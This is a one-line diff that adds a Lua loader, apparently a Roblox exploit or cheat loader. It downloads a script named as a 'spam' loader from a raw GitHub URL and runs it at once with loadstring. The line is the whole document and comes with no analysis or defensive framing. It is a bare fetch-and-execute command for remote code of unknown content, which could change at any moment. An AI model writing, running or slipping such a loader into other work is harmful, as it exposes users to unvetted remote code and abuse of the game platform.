@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/huss-valley-spam7-i5pb1rulf0gvg5.lua"))()
